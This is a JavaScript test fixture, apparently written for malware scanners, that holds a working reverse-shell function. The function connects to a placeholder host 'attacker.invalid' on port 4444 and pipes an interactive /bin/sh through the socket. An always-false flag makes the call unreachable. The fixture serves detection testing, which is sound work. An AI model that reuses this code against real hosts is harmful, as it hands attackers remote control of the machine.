/*
 * INERT MALWARE TEST FIXTURE — NOT REAL MALWARE.
 * Signature: opens a TCP socket to a remote host and pipes it into a spawned
 * shell (classic reverse shell).
 * Defanged: guard is always false and the address is 127.0.0.1 / .invalid, so
 * no socket is opened and no shell is spawned when this file runs.
 */
'use strict';

const net = require('net');
const { spawn } = require('child_process');

const ENABLE_SHELL = false; // never true — keeps this fixture inert

const C2_HOST = 'attacker.invalid'; // reserved TLD, never resolves
const C2_PORT = 4444;

function openReverseShell() {
  const socket = net.connect(C2_PORT, C2_HOST, () => {
    // signature: stdio of a shell wired to a remote socket
    const shell = spawn('/bin/sh', ['-i']);
    socket.pipe(shell.stdin);
    shell.stdout.pipe(socket);
    shell.stderr.pipe(socket);
  });
  return socket;
}

if (ENABLE_SHELL) {
  // Unreachable: present only so static scanners can flag the pattern.
  openReverseShell();
}

module.exports = { openReverseShell };
